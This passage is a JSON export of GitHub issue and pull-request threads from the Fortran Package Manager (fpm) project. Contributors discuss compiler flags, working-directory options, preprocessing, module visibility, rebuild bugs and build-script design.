think it should use the llvm-ar binary from the Intel toolchain though."
                },
                {
                    "user": "LKedward",
                    "date": "2021-06-03 15:24:37+00:00",
                    "text": "Thanks for reporting @brocolis - I believe #451 will make it much easier to directly address these kinds of Windows specific problems."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-05 18:57:09+00:00",
                    "text": "I think we can now look into this issue, the compile command for C source is generated here:\n\n  \n    \n      fpm/src/fpm_compiler.f90\n    \n    \n        Lines 669 to 670\n      in\n      5c908fc\n    \n    \n    \n    \n\n        \n          \n           call run(self%cc // \" -c \" // input // \" \" // args // \" -o \" // output, & \n        \n\n        \n          \n               & echo=self%echo, exitstat=stat) \n        \n    \n  \n\n\nInstead we should save the compile-but-not-link-C-source argument in the compiler object when constructing the object and just use it when assembling the compile command."
                }
            ]
        },
        {
            "number": 485,
            "user": "Carltoffel",
            "date": "2021-06-02 08:16:56+00:00",
            "title": "Don't Print Backtrace When Unit Tests Failed",
            "text": "If one test in the testing framework called by fpm test fails, the framework will likely return an exit code >0. This leads to fpm calling error stop which causes printing the backtrace in the console (at least if fpm was compiled with gfortran). This can cause some confusion, because the program did exactly what it was meant to do, but the backtrace implies something went unexpectedly wrong.\n@everythingfunctional and I discussed the same behaviour in his vegetables project where he ended up with replacing error stop with stop 1. Brad tested some combinations of compiler and OS and it sounds promising as long as there aren't multiply images.\nWhat do you think? Does the same approach applies for fpm or is there even a better way?",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-06-02 08:57:38+00:00",
                    "text": "Yes I agree, we don't need to be using error stop in fpm. I started work (LKedward@086ae55) on improving the error handling messages during compilation which would extend naturally to the case described here."
                }
            ]
        },
        {
            "number": 484,
            "user": "urbanjost",
            "date": "2021-06-01 05:41:19+00:00",
            "title": "alpha plugins, take III",
            "text": "When trying to update #364 all I got was \"Sorry, an error occurred\" so this is a reconstituted pull request.  See #364 and #362 for previous comments.",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2021-06-01 23:10:32+00:00",
                    "text": "The response file concept was part of an earlier PR  proposing a --flag option which was reduced to just the --compiler option and a suggestion from @awvwgk.  It allowed me to experiment with several concepts concerning an ealier --profile proposal and is useful but I decided at the time that it was probably better to put the profiles into the manifest itself with a compiler and os and flag list comprising a profile, and then (since the manifest file has no conditional capabilities) that fpm could then just choose based on current compiler and OS and profile name so the logic incorporated into fpm would not be too complex. As-is it does not quite do what I want with a subcommand, is not recursive, only uses the last specification of an option specified multiple times, which I originally planned on changing (and a few other things)  and can select between options based on OS but not on compiler  it has limitations but is useful so I put a basic description in of the simplest use case with a reference to the M_CLI2 github repository. I originally proposed it as a prototype for discussion but with the other solutions for a package-able custom build proceeding and being part of the GSOC and this being a \"free\" feature from M_CLI2 I think it can proceed as a supplemental feature as-is(?)"
                },
                {
                    "user": "LKedward",
                    "date": "2021-06-05 12:49:07+00:00",
                    "text": "Including the original PR (#364), we have four approvals so I'll now merge. Thanks @urbanjost"
                }
            ]
        },
        {
            "number": 483,
            "user": "awvwgk",
            "date": "2021-05-27 18:12:11+00:00",
            "title": "Allow fpm to change the working directory",
            "text": "This allow to use fpm -C <PATH> to change the working directory and enables the automatic discovery of a package manifest in the parent directories.\nExplicitly changing of directories\n-C, --directory PATH: Change working directory to PATH before running any command.\nAfter checking out this pull request locally, you should be able to build the example package by:\nfpm run -- build -C example_packages/hello_fpm\n\nAutomatic discovery of manifest files\nWith a directory changing mechanism we can also easily implement a mechanism to \u201dfind\u201d the package manifest in a parent directory. For this purpose fpm will retrieve the current working directory and check if a package manifest exists in any of the parent directories. By changing to this directory, all other commands can be used directly without modification.\nYou should be able to check this behavior with\nfpm run -- build -C example_packages/hello_fpm/app\n\nIf you copy / install the fpm executable you can also check the automatic discovery without the -C / --directory option. It should work just the same.\nPlease try to break this feature.\n\nCaveats\nThis introduces preprocessor usage into fpm, not sure if we are actually able to avoid it without using compiler extensions at this point.\nRelated #481, #172",
            "comments": [
                {
                    "user": "certik",
                    "date": "2021-05-27 18:29:57+00:00",
                    "text": "I don't think this PR closes #481 (or its duplicate #172). To close it, it should work by running fpm without any -C option.\nI think this PR closes #411 and #410. My only question would be whether it the flag should be called -C or rather --directory as suggested in those issues."
                },
                {
                    "user": "LKedward",
                    "date": "2021-05-27 18:42:55+00:00",
                    "text": "Yes, this would only close #411. The idea for #410 is subtly different and would actually require a different command line option so that it can be used in combination with #411.\nEdit: Milan gives a good example and explanation in #411 for how they could be used in combination"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-05-27 19:43:13+00:00",
                    "text": "Okay, than let's try this:\n\nfpm can change with -C or --directory the working directory.\nfpm will search within the file system boundaries for an fpm.toml file, if it finds a package manifest, it will change to this directory\n\nGive it a try:\n\u276f fpm run -- build -C example_packages/hello_fpm/app\nfpm: Entering directory '/home/awvwgk/projects/src/git/fortran-package-manager/example_packages/hello_fpm/app'\nfpm: Entering directory '/home/awvwgk/projects/src/git/fortran-package-manager/example_packages/hello_fpm'\nfpm: Leaving directory '/home/awvwgk/projects/src/git/fortran-package-manager/example_packages/hello_fpm'\nfpm: Leaving directory '/home/awvwgk/projects/src/git/fortran-package-manager/example_packages/hello_fpm/app'"
                },
                {
                    "user": "LKedward",
                    "date": "2021-05-28 12:46:00+00:00",
                    "text": "Autodiscovery seems to works nicely but would it not be better to change back to the original directory after the model has been built? This would allow me to do fpm run or fpm test in a different directory to the directory containing the manifest (like #410). By example, if I run git status in a subdirectory, then it finds the git repo in the parent directory but still executes the subcommand as if it's in the current directory.\nIt seems that we still need two separate options:\n\n--manifest-path (as in #411) which only affects the project root and defaults to the autodiscovery process here\n--directory as implemented here, change directory before doing anything\n\nWhat do you think?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-05-30 09:42:36+00:00",
                    "text": "I think we will need both, knowledge about the working directory and the project root at every point in fpm.\nWith this patch right now a command like\nfpm -C example_packages/hello_fpm run --runner cp -- .\n\nwill copy the executable into example_packages/hello_fpm rather than the actual current working directory. Changing this in fpm requires some deeper modification how we handle file paths and how we spawn subprocesses, but this is definitely a desirable change."
                },
                {
                    "user": "LKedward",
                    "date": "2021-06-05 12:35:08+00:00",
                    "text": "This looks good to go so with two approvals I'll now merge. Thanks @awvwgk"
                }
            ]
        },
        {
            "number": 482,
            "user": "isuruf",
            "date": "2021-05-27 16:52:35+00:00",
            "title": "Support appending flags",
            "text": "In other build systems, a user can give a set of flags that are appended to the default set of flags.\nfpm build --flag <flags> overrides the defaults which is not what I want.\nAlso, it'd be great if this was supported as an environment flag FFLAGS which would make fpm\nbehave like every other build system. (CMake, autoconf, setuptools, meson, etc)",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-05-27 16:56:59+00:00",
                    "text": "To retain the defaults you can specify the profile you want to append your flags to\nfpm build --profile release --flag <flag>\n\nReading from FFLAGS automatically would be nice, but we are also ignoring FC right now and use our own FPM_COMPILER variable instead."
                },
                {
                    "user": "isuruf",
                    "date": "2021-05-27 16:58:52+00:00",
                    "text": "Thanks @awvwgk. If I have a set of flags in FFLAGS, I can't pass them like fpm build --profile release --flag $FFLAGS  right? Is there a way to send in multiple without specifying --flag multiple times?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-05-27 16:59:52+00:00",
                    "text": "I don't see why\nfpm build --profile release --flag \"$FFLAGS\"\n\nwouldn't work for this purpose."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-05-27 17:00:41+00:00",
                    "text": "We are actually using this already for bootstrapping:\n\n  \n    \n      fpm/install.sh\n    \n    \n         Line 69\n      in\n      6d9004d\n    \n    \n    \n    \n\n        \n          \n           $BOOTSTRAP_DIR/fpm install --compiler \"$FC\" --flag \"$FFLAGS\" --prefix \"$PREFIX\""
                },
                {
                    "user": "isuruf",
                    "date": "2021-05-27 17:01:20+00:00",
                    "text": "That's great. Thanks."
                }
            ]
        },
        {
            "number": 481,
            "user": "certik",
            "date": "2021-05-27 16:18:13+00:00",
            "title": "Add an option to run fpm in a subdirectory",
            "text": "Currently fpm must be run from the root directory where fpm.toml is. We should extend the usage to also work in any subdirectory of the project. Just like git works. That way you can go into into a subdirectory, use vim to edit a file and do fpm build or fpm test to run tests right away. Currently you have to have two terminals open, one where you run fpm build and another way where you can go into subdirectories to edit files.\nRelated issues: #411, #410.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-05-27 16:45:48+00:00",
                    "text": "As a vim user I have to strongly disagree on the above issue, so far it never occurred to me to leave the project root directory to edit a file.\nJoke aside, a -C like option would be a welcome addition. I would prefer we find a way to implement it without explicitly carrying around the current working directory in the fpm source and pass it along to shell processes spawned by execute_command_line, maybe there is a simple solution to change the working directory for the process using stdlib_os."
                },
                {
                    "user": "LKedward",
                    "date": "2021-05-27 17:49:32+00:00",
                    "text": "Duplicate of #172. See there for some brief discussion of using chdir for this."
                },
                {
                    "user": "certik",
                    "date": "2021-05-27 18:23:24+00:00",
                    "text": "Closing in favor of #172."
                },
                {
                    "user": "certik",
                    "date": "2021-05-27 18:25:14+00:00",
                    "text": "As a vim user I have to strongly disagree on the above issue, so far it never occurred to me to leave the project root directory to edit a file.\n\nCan you be more specific what you strongly disagree with? What I described is a very common workflow situation, as for example described in #172."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-05-27 18:48:29+00:00",
                    "text": "Just a curiosity I noticed, many people use cd src; vim fpm.f90 rather than just using vim src/fpm.f90. The latter will retain the working directory as the project toplevel and allow to easily run commands with :!fpm run from inside vim, together with the netrw built-in file navigator (:E) I usually tend to open a single vim session while working on a project without ever changing directories. It's quite liberating to know you can always run any command straight from vim in the project root."
                },
                {
                    "user": "certik",
                    "date": "2021-05-27 20:45:33+00:00",
                    "text": "I see. Yes, I used to use :!... a lot. I even have this in my .vimrc:\nmap <F10> :!/usr/bin/env python %<CR>\nTo run the currently opened file. But being in the current directory and :!fpm run should now work also due to #483. I also frequently escape vim and do git diff . to see the changes just in this directory, ls, etc."
                }
            ]
        },
        {
            "number": 475,
            "user": "awvwgk",
            "date": "2021-05-21 14:25:42+00:00",
            "title": "Universal Fortran compiler",
            "text": "Suggested on discourse: https://fortran-lang.discourse.group/t/gsoc-project-meeting-fpm-compiler-flags/1265/3\nI really like the idea of having an universal Fortran compiler in fpm. We could have fpm provide a compiler wrapper which abstracts existing compilers and tries to normalize command line options. The possibly best way to realize this might be a separate fpm project which provides an fpm-compiler command as standalone and fpm plugin as well as a library which fpm can depend on to actually make use of the compiler abstraction for the target compilation.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-05-24 07:42:13+00:00",
                    "text": "I'm also a fan of this idea and it is not something I'd ever considered before. This would also open up the opportunity to standardise a directory structure for distributing Fortran module-based libraries as discussed here."
                },
                {
                    "user": "certik",
                    "date": "2021-05-27 16:25:57+00:00",
                    "text": "Indeed. I think there is a large common denominator of all Fortran compilers, that we should provide a unified interface to. This is another avenue to tackle #443, as we slowly build this \"unified interface\", we can then use it in fpm itself to provide good support for things like fast-math or debugging options such as array bounds checking."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-06-02 01:05:16+00:00",
                    "text": "In my own environment I use a command (ccall) for programs (not for libraries, there is something else for that)\n$ ccall --help\nuntitled()                                                          untitled()\n\nNAME\n       ccall(1) - identifies system and then compiles and loads and installs\n       C, Fortran, and manpages\n\nSYNOPSIS\n       ccall file.[f|F|c|f90|F90|.ff|.FF|html|HTML|[1-8]|.man] other_options\n       ccall -r ccall [-h]\n\nDESCRIPTION\n       Given program source code or other files needing processing, determine\n       what system you are on, preprocess the files based on their suffix, and\n       then build and install them in a standard location.\n\n       The installation area top directory set is by $CCALL_HOME (that\n       defaults to $HOME). It ia assumed to have subdirectories bin/, lib/,\n       and doc/man in it. A subdirectory is expected under bin called\n       $TARGET_REV this is for a unique programming environment.  If\n       $TARGET_REV is not set the output of the command \"systemtype -r\" is\n       used to create a directory.\n\n       A number of libraries and options are defined for each programming\n       environment so that all that is typically required to build and load a\n       program is\n\n             ccall $FILENAME\n\n       You need to add any new programming environment to the script.\n\n       \"ccall -r\" return a name that includes which Fortran compiler is\n       available.\n\n       \"ccall -h\" shows help.\n\n       NAME.[f|F|c|f90|F90]\n              Load a main program using the libraries and other common options\n              used on various platforms (UNICOS, Tru64 Unix, HP-UX, AIX,\n              SunOS, Solaris, ...)\n\n       NAME.[ff|FF]\n              Run .ff thru \"uffp TESTPRG90 ...\" and .FF thru \"ufpp TESTPRG90\n              -system\" and then treat files as .F90 files.\n\n       NAME.[html|HTML]\n              If an HTML file is given; run through f2html to extract Fortran\n              and then treat it as a .ff or .FF file.\n\n              Then run it thru c2html and then treat any output file as a .c\n              file.\n\n       NAME.[1-8]|, NAME.[1-8],txt\n              installs man(1) pages.  The files are compressed with gzip(1)\n              and placed in the directory pointed to by $PUTMAN.\n\n       NAME.[1-8]*.man\n              Run file thru txt2man(1) to creat a *roff file and install the\n              file as a man(1) page.\n\nENVIRONMENT\n       PREFIX options before filename when loaded\n\n       SUFFIX options after filename when loaded\n\n       NOTTHEREONLY\n              if TRUE, do not build if output file already exists\n\n       CCALL_OS\n              generic programming environment name. Defaults to output of\n              \"systemtype\". Used to select compiler and loader options for a\n              system.\n\n       CCALL_COMPILER\n              compiler-specific programming environment name. Defaults to\n              output of \"systemtype -r\". Used to create subdirectory to place\n              executables in in $CCALL_HOME/bin/. Selects additional compiler\n              options specific to a particular compiler. $CCALL_OS identified\n              the type of system you are on, $CCALL_COMPILER specified a very\n              specific programming environment.\n\n       CCALL_HOME\n              top directory where output directors bin/, lib/, and doc/man\n              exist defaults to $HOME.\n\n       CCALL_LOG\n              name of log file to create. By default no log is created\n\n       PUT    directory to place binaries in (defaults to\n              $CCALL_HOME/bin/$TARGET_REV)\n\n       PUTMAN directory to place man pages in (defaults to\n              $CCALL_HOME/doc/man)\n\n       TMPDIR top directory where scratch files are generated. Defaults to\n              /tmp\n\nEXAMPLES\n       Sample calls:\n\nThat defaults to specifying about twentyfive libraries  so I just enter \"ccall FILENAME\" and it builds an executable and places in in the correct bin/ subdirectory (one for each programming environment) that I have used for a very long time and miss in any environment I do not have it in. Everything in netlib and the \"real\" GPF collection is predefined in the load path; and it preselects a compiler depending on which ones it finds in the path if no environmental variables are set.  So I totally like the idea of a universal compiler command.  We did a similar thing for years in a production environment where you just entered \"f90\" or \"cc\" so that batch jobs did not have to typically change when new environments were created.  I have been thinking about that for a while and wondering about making it more \"fpm-ish\" where, especially assuming that profiles can be in the manifest files soon that you could have a universal compiler command that could use an fpm environment \"remotely\" from any directory that could specify a list of dependencies and compiler options.  So something where an fpm directory could be used somewhat like modules but have waffled on whether I would want it to build the file where it is just using the information, or automatically create a cloned fpm package and if so whether it should all be in a scratch area that gets cleaned up after the build or if it creates and leaves the program as a package.  It seems like a lot of the pieces are there. Maybe it sounds lazy, as I could new an \"fpm new\" and copy in my favorite fpm.toml file and the program file relatively easily, but trying to move more files to fpm I miss ccall the most, and was thinking the environment that you can create with fpm could be leveraged to set up a pre-defined load environment like ccall, and already has an install capability too. So basically, I think a \"universal compiler\" is great, and would be particularly useful in solving some of the issues fpm faces; but I also think there is something fpm can provide back to the universal compiler.  So If I could set up an fpm package area with no packages in it and specify compiler options, load options, and a default install area and then use the universal compiler command pointed to that \"empty\" fpm package I would feel right at home and I think it would be better than ccall.  I need to take some time to put the idea down more coherently, but this (#475) would go a long way towards that.\nPS:  ccall has been around maybe a bit too long -- I was just looking at it for the first time in a while and it still has branches for some OS environments that have not existed for a long time (anyone ever heard of COS and Aegis and SunOS?) but it shows how portable and long-lived a Fortran app can be)."
                }
            ]
        },
        {
            "number": 473,
            "user": "HaoZeke",
            "date": "2021-05-12 11:13:06+00:00",
            "title": "Caching `fpm` version",
            "text": "Currently the cache.toml file does not include the version of fpm used to generate it; unless fpm is specified as a dependency in the fpm.toml file. This seems a little counter-intuitive; and it might make sense for the cache.toml file to include the fpm version used by default.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-05-12 11:44:20+00:00",
                    "text": "I like the idea, but I don't see how fpm could make use of this information right now. If fpm 0.3.0 changes the cache.toml format and receives a cache.toml generated from fpm 0.2.0 it would probably invalidate the cache automatically and regenerate it rather than migrating it internally to the new format right now. Migrating from a version to another requires to keep a track of the schema changes in fpm in some way (it's possible with toml-f, but maybe not worth the effort as long as cache.toml is a build artifact rather than an actual lock file).\nInstead we should think about versioning the dependency lock file format once we implement it."
                },
                {
                    "user": "HaoZeke",
                    "date": "2021-05-12 11:51:30+00:00",
                    "text": "Ah that makes sense. I was under the impression that the cache.toml was meant to be the dependency lock file; will close this and keep an eye out for the discussion about the lock file format!"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-05-12 11:55:07+00:00",
                    "text": "See #320"
                }
            ]
        },
        {
            "number": 469,
            "user": "p-costa",
            "date": "2021-04-30 11:08:34+00:00",
            "title": "source pre-processing prior to determining dependencies",
            "text": "Hi all,\nAs far as I understand, pre-processor support by fpm is still under discussion (#78, #308, #425).\nI have a use case where I build my source code together with modules from an external library. Some of these modules are not present in my src directory because they not needed -- the underlying dependencies within this library are masked by (cpp) pre-processing.\nSo, in short, I wanted to ask if you consider supporting pre-processing specific source files (similar to this #425 (comment)), prior to generating dependencies?\nE.g.:\nmodule mod_a\n#ifdef _B\nuse mod_b, only: b\n#endif\n(...)\nwith the dependency of  mod_b in mod_a not determined if mod_a is not compiled with -cpp -D_B?\nThanks!",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-04-30 13:31:28+00:00",
                    "text": "Thanks Pedro @p-costa, this is definitely something that needs discussing before we start implementing it.\nThe situation you describe is the main difficulty in implementing pre-processing in fpm.\nIf fpm could just pre-process after determining dependencies then it would be quite straightforward to implement.\nUnfortunately pre-processing before determining dependencies requires a little more thought.\nI'm glad you opened this issue because now I know that it is important to users for use-cases like this.\nIn your particular case, does it matter if the unused modules are compiled anyway even if not used? Currently fpm doesn't have any mechanism yet to selectively exclude certain library sources from compilation. So even if pre-processing happened before dependency checking, fpm would still compile all library modules (which may be a problem if you are using this mechanism to switch out a dependency like MPI for example)."
                },
                {
                    "user": "p-costa",
                    "date": "2021-04-30 14:18:00+00:00",
                    "text": "Thanks! I just wanted to raise awareness about this potential use case.\n\nIn your particular case, does it matter if the unused modules are compiled anyway even if not used? Currently fpm doesn't have any mechanism yet to selectively exclude certain library sources from compilation.\n\nIn my case it is not a major issue. It is just that I need to have 11 additional source files on my repo once it supports fpm, or modify the source code of the library. But perhaps there are other use cases where this could matter (e.g. less permissive license of some source files). Of course, the build process would also be more efficient.\n(just for context -- I built the code CaNS using fpm, which is compiled with the source of the 2DECOMP&FFT library (with some additional changes w.r.t. the original 2DECOMP&FFT implementation), without using the Library's FFT API)."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-04-30 14:49:28+00:00",
                    "text": "One more tricky case is the Fortran template library where the name of the modules is generated by a preprocessor statement.\nmodule CAT3(ftlArray,FTL_TEMPLATE_TYPE_NAME,Module)\nI also talked briefly with B\u00e1lint (@aradi) on supporting fypp in fpm and we arrived at the conclusion that this is currently not easily possible.\nA notable reference could be ninja which has added a dynamic dependency feature explicitly for Fortran in ninja-build/ninja#1521, which is required in CMake for building Fortran projects (see cmake/cmake!3256) and for meson's recently introduced dependency scanner (mesonbuild/meson#8095)."
                },
                {
                    "user": "LKedward",
                    "date": "2021-04-30 15:05:56+00:00",
                    "text": "... we arrived at the conclusion that this is currently not easily possible.\n\nTo be clear, I am not aware of any fundamental reason why this cannot be done, it will just require some significant restructuring of fpm to insert a new pre-process phase to the workflow. Please correct me if I am wrong."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-04-30 15:21:49+00:00",
                    "text": "I am not aware of any fundamental reason why this cannot be done, it will just require some significant restructuring of fpm to insert a new pre-process phase to the workflow\n\nI fully agree with this statement."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-06-05 19:21:00+00:00",
                    "text": "In a system I use you can specify a pre-processor command based on file suffix (including plain .f and .f90) and all files are preprocessed and/or copied to a second scratch directory and then the dependencies and build is based only on the expanded files.\nThat was more straight-forward. In addition, those expanded files are put into an ar(1) library as well and several other steps, but the reasons for that do not apply here.  You have to make sure the preprocessor is available on the platforms you want to build on which raises other issues, but I would find fpm much easier to use if I could put a line in my manifest that specified the pre-processor rule for different suffixes.  As it is, I maintain virtually every file as a *.FF file and have to use custom tools to pre-process those and place the output files in the fpm directories post-processed. Since fpm uses a cached checksum instead of the date I realized recently I actually do not have to only do that with changed files which is simpler than what I have been doing. Since fpm` also does not require a manually edited \"make-file\" that might be easier?  I find it cleaner than having a .FF file creating a .f90 file in the same directory. There are also a set of \"standard\" environmental variables set so you know OSTYPE and COMPILER and BUILDTIME are always set, as the built-in pre-processor variables vary a lot between different programming environments."
                }
            ]
        },
        {
            "number": 468,
            "user": "ibara",
            "date": "2021-04-29 19:55:05+00:00",
            "title": "Identify OpenBSD.",
            "text": "Hello --\nI recently learned about fpm.\nThis PR adds explicit identification of OpenBSD. It is primarily cosmetic.\nThanks!",
            "comments": []
        },
        {
            "number": 465,
            "user": "imjasonmiller",
            "date": "2021-04-29 09:23:02+00:00",
            "title": "Fix typo in README",
            "text": "",
            "comments": []
        },
        {
            "number": 464,
            "user": "awvwgk",
            "date": "2021-04-26 18:22:44+00:00",
            "title": "Allow to use only modules from direct dependencies",
            "text": "Currently all modules of all dependencies are visible to all projects in the dependency tree. Depending by accident on a module of a transient dependency is not an error but could break the build if the dependency tree changes and the module or the transient dependency is removed upstream. Selectively hiding/including modules would also provide a mechanism to cope with name clashes for unrelated modules with the same name.\nRequires #355",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-04-26 18:47:53+00:00",
                    "text": "Selectively hiding/including modules would also provide a mechanism to cope with name clashes for unrelated modules with the same name.\n\nHow would this work? Surely you could still end up with symbol clashes?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-04-26 19:06:39+00:00",
                    "text": "Unless the two modules don't specify the same function names there won't be a symbol clash.\nOne mechanism could be to have separate module directories for each subproject like in this tree:\nbuild\n\u2514\u2500\u2500 gfortran_2A42023B310FA28D\n    \u251c\u2500\u2500 dep-1\n    \u2502   \u2514\u2500\u2500 lib\n    \u2502       \u2514\u2500\u2500 wrapper.mod\n    \u251c\u2500\u2500 dep-1-dep\n    \u2502   \u2514\u2500\u2500 lib\n    \u2502       \u2514\u2500\u2500 utils.mod\n    \u251c\u2500\u2500 dep-2\n    \u2502   \u2514\u2500\u2500 lib\n    \u2502       \u2514\u2500\u2500 m_dep.mod\n    \u2514\u2500\u2500 main-proj\n        \u251c\u2500\u2500 app\n        \u2502   \u251c\u2500\u2500 main-exe\n        \u2502   \u2502   \u2514\u2500\u2500 utils.mod\n        \u2502   \u2514\u2500\u2500 helper-exe\n        \u2502       \u2514\u2500\u2500 utils.mod\n        \u2514\u2500\u2500 lib\n            \u2514\u2500\u2500 main.mod\n\nI think this is mainly useful for executable, test or example targets where multiple targets might define modules with the same name. But could also be used to hide dependencies with problematic module names behind a simple reexport wrapper."
                }
            ]
        },
        {
            "number": 463,
            "user": "awvwgk",
            "date": "2021-04-26 17:58:24+00:00",
            "title": "Incremental rebuild failure",
            "text": "Working on a bigger project with fpm (~130 source files in 6 projects currently), I run frequently into issue with the incremental rebuild (once or twice a day), which forces me to delete the build/gfortran_* directories to start from scratch. Given the size of the project and its highly experimental stage it is hard to create a minimal reproducer right now.\nThe issue manifest in a compile time error due to type mismatch when adding a new component to a derived type or a runtime error / segmentation fault due to interface mismatches when changing dummy argument. The state is pretty much permanent once reached and selectively modifying files in the dependency tree does not trigger the complete rebuild as expected.\nI'll try to create a minimal reproducer on the next occasion I run into this, but no promises.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-04-26 18:36:37+00:00",
                    "text": "... selectively modifying files in the dependency tree does not trigger the complete rebuild as expected.\n\nBased on this statement I would hazard a guess that a module dependency is not being detected properly.\nIt may perhaps be easier to pinpoint the bug if you focus on which files, when changed, do not trigger a rebuild as expected.\nEDIT: It might be worth checking for a known limitation when detecting module use statements where there is a continuation before the module name:\n\n  \n    \n      fpm/src/fpm_source_parsing.f90\n    \n    \n        Lines 67 to 72\n      in\n      a9adf2b\n    \n    \n    \n    \n\n        \n          \n           !> This is __NOT supported:__ \n        \n\n        \n          \n           !> \n        \n\n        \n          \n           !>```fortran \n        \n\n        \n          \n           !> use & \n        \n\n        \n          \n           !>    my_module \n        \n\n        \n          \n           !>``` \n        \n    \n  \n\n\nIt seems this case fails silently which is not ideal - I'll take a look."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-04-26 18:52:50+00:00",
                    "text": "No continuation characters and no preprocessor used for module names here."
                },
                {
                    "user": "AshyIsMe",
                    "date": "2021-09-05 05:15:02+00:00",
                    "text": "It's not really a minimal reproducer but I think I've been running into the same issue in this small project here: https://github.com/AshyIsMe/flox\nI'm not sure if it's the *.mod files that sometimes fail to rebuild even though the source files have changed or if it's something else.\nMy quick hack workaround is this make clean rule defined here:\nhttps://github.com/AshyIsMe/flox/blob/main/Makefile"
                }
            ]
        },
        {
            "number": 457,
            "user": "awvwgk",
            "date": "2021-04-24 12:50:06+00:00",
            "title": "Build script first steps: getting a list of source files",
            "text": "To get started with the (two-way) build script, let's begin with something simple to explore how we can implement the basic required infrastructure.\nGetting a list of source files, that is something fpm usually does automatically, but maybe if you have submodules which implement different functionality like in the Focal project this could be needed.\nThe output of the build script could look like this (maybe we find better/shorter keywords):\nfpm:library-source=\"src/lib.f90\"\nfpm:app-<name>-source=\"app/util.f90\"\nfpm:app-<name>-main=\"app/main.f90\"\nfpm:demo-<name>-source=\"example/util.f90\"\nfpm:demo-<name>-main=\"example/main.f90\"\nfpm:test-<name>-source=\"test/util.f90\"\nfpm:test-<name>-main=\"test/main.f90\"\n...\n\nThe input would be given by environment variables or maybe command line arguments.\nFPM_COMPILER=gfortran\nFPM_BUILD_PROFILE=debug\n...\n\nIn case of Focal the build script could decide depending on the value of FPM_BUILD_PROFILE which submodule source files to compile.\nFor the initial implementation we could just rely on the build script being executable, which would already allow shell, python, ruby, ... scripts as input. The input for the script would be in the build table:\n[build]\nscript = \"build.py\"",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-04-24 13:35:04+00:00",
                    "text": "This is a good place to start and your proposed methodology looks good to me. I'm not too bothered about the verbosity of the keywords because presumably they can be abstracted away in functions.\n\nWith regards to Focal, in the short term I will likely replace the mutually exclusive submodules with a single submodule containing #ifdef DEBUG directives just to get it working with fpm. In the long term I had wondered whether fpm might eventually support selective inclusion/exclusion of sources based on selected profile/features/OS etc.. I think this would be beneficial because Fortran submodules are well suited to this kind of plug-and-play of implementation."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-04-24 20:54:32+00:00",
                    "text": "I had wondered whether fpm might eventually support selective inclusion/exclusion of sources based on selected profile/features/OS etc.\n\nSubmodules seem like the right mechanism for conditional compilation without having to rely on preprocessor, still I wonder how an automatic selection rule would look like for this purpose. Are you aware of any existing convention for submodule naming regarding this?"
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-04-24 21:35:01+00:00",
                    "text": "While not exactly conditional compilation, I also found submodules very effective to switch between different algorithms/implementations while benchmarking the ascii character classification routines (see https://github.com/ivan-pi/fortran-ascii/blob/09c26de1cf00119eb5e8c3316e8163fa1677b3ca/Makefile#L39). Thinking of stdlib, I envisioned that in the future it would be possible to switch between different implementations/backends using submodules."
                },
                {
                    "user": "LKedward",
                    "date": "2021-04-25 08:57:19+00:00",
                    "text": "Submodules seem like the right mechanism for conditional compilation without having to rely on preprocessor, still I wonder how an automatic selection rule would look like for this purpose. Are you aware of any existing convention for submodule naming regarding this?\n\nYes I agree submodules are preferable for this than using a preprocessor, but I am not aware of any existing naming conventions or selection methods for doing this. Should we open a new issue to discuss this kind of conditional compilation?"
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-04-26 10:42:10+00:00",
                    "text": "Just found another use case for submodules (I can provide a pdf copy if needed):\n\nBader, R. (2006, August). Dynamic polymorphism in Fortran 95: how submodules can help. In ACM SIGPLAN Fortran Forum (Vol. 25, No. 2, pp. 3-7). https://doi.org/10.1145/1148105.1148106"
                },
                {
                    "user": "arjenmarkus",
                    "date": "2021-04-26 10:51:48+00:00",
                    "text": "Please do provide that. I have a paper copy somewhere, but a PDF version\nprovides easier access :).\n\nOp ma 26 apr. 2021 om 12:42 schreef Ivan Pribec ***@***.***>:\n\u2026\n Just found another use case for submodules (I can provide a pdf copy if\n needed):\n\n Bader, R. (2006, August). Dynamic polymorphism in Fortran 95: how\n submodules can help. In ACM SIGPLAN Fortran Forum (Vol. 25, No. 2, pp.\n 3-7). https://doi.org/10.1145/1148105.1148106\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#457 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR4H7HYDJ6ZN37KRF33TKU7RDANCNFSM43QDXBFA>\n ."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-06-05 19:50:52+00:00",
                    "text": "Another option I miss, but only in a few projects, is conditional source directory selection. That is, when you have abstracted very system-specific routines with your own procedures so the file and function names are the same but there is very little if any duplicated code it is nice to say to build src/Microsoft instead of src/Solaris or src/BSD or src/Linux, where each directory contains the system-specific source for a particular platform.  Just something else to add to the wish-list :>"
                }
            ]
        },
        {
            "number": 456,
            "user": "brocolis",
            "date": "2021-04-24 04:07:59+00:00",
            "title": "fpm displays GNU' ar Copyright notice ",
